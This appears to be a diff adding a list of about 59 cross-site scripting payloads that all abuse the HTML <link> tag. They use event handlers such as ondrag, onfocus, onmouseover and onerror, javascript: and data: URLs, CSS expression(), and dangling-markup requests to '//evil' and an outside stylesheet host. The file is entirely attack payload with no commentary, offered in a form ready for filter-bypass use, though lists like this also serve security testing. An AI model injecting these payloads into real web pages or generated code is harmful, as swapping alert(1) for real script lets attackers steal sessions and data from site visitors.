@@ -1,0 +1,59 @@
+<link draggable="true" ondrag="alert(1)">test</link>
+<link draggable="true" ondragend="alert(1)">test</link>
+<link draggable="true" ondragenter="alert(1)">test</link>
+<link draggable="true" ondragleave="alert(1)">test</link>
+<link draggable="true" ondragstart="alert(1)">test</link>
+<link href=validstyles.css rel=stylesheet onload=alert(1)>
+<link id=x tabindex=1 onactivate=alert(1)></link>
+<link id=x tabindex=1 onbeforeactivate=alert(1)></link>
+<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>
+<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>
+<link onafterscriptexecute=alert(1)><script>1</script>
+<link onbeforecopy="alert(1)" contenteditable>test</link>
+<link onbeforecut="alert(1)" contenteditable>test</link>
+<link onbeforepaste="alert(1)" contenteditable>test</link>
+<link onbeforescriptexecute=alert(1)><script>1</script>
+<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onclick="alert(1)">test</link>
+<link oncontextmenu="alert(1)">test</link>
+<link oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<link oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<link ondblclick="alert(1)" autofocus tabindex=1>test</link>
+<link onfocus=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusin=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onkeydown="alert(1)" contenteditable>test</link>
+<link onkeypress="alert(1)" contenteditable>test</link>
+<link onkeyup="alert(1)" contenteditable>test</link>
+<link onmousedown="alert(1)">test</link>
+<link onmouseenter="alert(1)">test</link>
+<link onmouseleave="alert(1)">test</link>
+<link onmousemove="alert(1)">test</link>
+<link onmouseout="alert(1)">test</link>
+<link onmouseover="alert(1)">test</link>
+<link onmouseup="alert(1)">test</link>
+<link onmousewheel=alert(1)>requires scrolling
+<link onpaste="alert(1)" contenteditable>test</link>
+<link onpointerdown=alert(1)>XSS</link>
+<link onpointerenter=alert(1)>XSS</link>
+<link onpointerleave=alert(1)>XSS</link>
+<link onpointermove=alert(1)>XSS</link>
+<link onpointerout=alert(1)>XSS</link>
+<link onpointerover=alert(1)>XSS</link>
+<link onpointerrawupdate=alert(1)>XSS</link>
+<link onpointerup=alert(1)>XSS</link>
+<link onreadystatechange=alert(1) rel=stylesheet href=1>
+<link rel=stylesheet href=1 onerror=alert(1)>
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<link rel=stylesheet href="//evil?
+<link rel=icon href="//evil?
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<link/rel=prefetch 
+<link rel="import" href="data:x,<script>alert(1)</script>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+
